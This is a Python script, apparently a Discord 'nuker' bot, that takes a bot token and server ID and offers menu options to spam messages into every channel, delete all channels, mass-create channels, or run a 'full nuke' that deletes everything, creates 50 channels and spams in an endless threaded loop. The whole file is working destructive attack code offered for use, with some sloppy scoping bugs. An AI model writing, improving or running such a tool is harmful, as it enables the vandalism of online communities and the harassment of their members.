import requests, os, random, json, sys
from pystyle import Colors, Colorate, Write
from threading import Thread
from time import sleep

os.system("title DISCORD NUKER BOT  :  V1  :  SETUP")
print(Colorate.Horizontal(Colors.purple_to_red, '''
┌┐┌┬ ┬┬┌─┌─┐  ┌┐ ┌─┐┌┬┐
││││ │├┴┐├┤   ├┴┐│ │ │ 
┘└┘└─┘┴ ┴└─┘  └─┘└─┘ ┴ By Pąblo#4316

Pąblo#4316 | https://github.com/palblo/DiscordNukeBot/
'''))
print(Colorate.Vertical(Colors.red_to_white, 'VERSION: V1.0'))
bot_token = Write.Input(f"\nbot token -> ", Colors.blue_to_purple, interval=0.00005)
guild_id = Write.Input(f"guild id -> ", Colors.blue_to_purple, interval=0.00005)

def main():
    os.system('cls')
    print(Colorate.Horizontal(Colors.purple_to_red, '''
┌┐┌┬ ┬┬┌─┌─┐  ┌┐ ┌─┐┌┬┐
││││ │├┴┐├┤   ├┴┐│ │ │ 
┘└┘└─┘┴ ┴└─┘  └─┘└─┘ ┴ By Pąblo#4316

Pąblo#4316 | https://github.com/palblo/DiscordNukeBot/
    '''))

    os.system("title DISCORD NUKER BOT  :  V1  :  HOME")

    print(Colorate.Vertical(Colors.red_to_white, '''
VERSION: V1.0
┌─────────────────────┐
│1 = SPAM             │
│2 = DELETE CHANNELS  │
│3 = CREATE CHANNELS  │
│4 = FULL NUKE        │
└─────────────────────┘

    '''))

    action = Write.Input(f"action -> ", Colors.blue_to_purple, interval=0.00005)
    header = {
        'authorization': f'Bot {bot_token}',
    }

    def SpamRequest():
        channel_id = random.choice(channels_id)
        r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", data=payload, headers=header)
    def DeleteChannel():
        r = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=header)
    def CreateChannel():
        r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json={"name": channelname, "permission_overwrites": [], "type": 0}, headers=header)

    if action == '1':
        def tstop(self):
          self._stop_event.set()
        os.system("title DISCORD NUKER BOT  :  V1  :  SPAM")
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channels_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.purple_to_red, '\nyou have selected SPAM', 1))
        message = Write.Input(f"\nmessage -> ", Colors.blue_to_purple, interval=0.00005)
        payload = {
            "content": message
        }
        print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Press ctrl+c to close', 1))
        for channels in channel_ids:
            t = Thread(target=SpamRequest).start()

    if action == '2':
        os.system("title DISCORD NUKER BOT  :  V1  :  DELETE CHANNELS")
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channel_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.purple_to_red, '\n[SELECT] you have selected DELETE CHANNELS', 1))
        sleep(1)
        print(Colorate.Horizontal(Colors.purple_to_red, '\n[LOG] Delenting channels...', 1))
        for channel_id in channel_id:
            Thread(target=DeleteChannel).start()
        print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Done', 1))
        sleep(3)
        main()   

    if action == '3':
        os.system("title DISCORD NUKER BOT  :  V1  :  CREATE CHANNELS")
        print(Colorate.Horizontal(Colors.purple_to_red, 'you have selected CREATE CHANNELS', 1))
        channelname = Write.Input(f"channels name -> ", Colors.blue_to_purple, interval=0.00005)
        channelsamount = int(Write.Input(f"how many channels? -> ", Colors.blue_to_purple, interval=0.00005))
        sleep(1)
        print(Colorate.Horizontal(Colors.purple_to_red, f'[LOG] Creating {channelsamount} channels...', 1))
        for i in range(channelsamount):
            Thread(target=CreateChannel).start()
        print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Done', 1))
        sleep(3)
        main()   

    if action == '4':
        os.system("title DISCORD NUKER BOT  :  V1  :  FULL NUKE")
        print(Colorate.Horizontal(Colors.purple_to_red, '\n[SELECT] you have selected FULL NUKE'))
        channelname = Write.Input(f"\nchannels name -> ", Colors.blue_to_purple, interval=0.00005)
        message = Write.Input(f"message -> ", Colors.blue_to_purple, interval=0.00005)
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channel_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.purple_to_red, f'\n[LOG] delenting all channels...', 1))
        for channel_id in channel_id:
            Thread(target=DeleteChannel).start()
        sleep(3)
        print(Colorate.Horizontal(Colors.purple_to_red, f'[LOG] creating 50 channels...', 1))
        for i in range(50):
            Thread(target=CreateChannel).start()
        payload = {
            "content": message
        }
        channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
        channels_id = [channel['id'] for channel in json.loads(channel_ids.text)]
        print(Colorate.Horizontal(Colors.purple_to_red, f'[LOG] Spamming', 1))
        print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Press ctrl+c to close', 1))
        while True:
            Thread(target=SpamRequest).start()

main()    
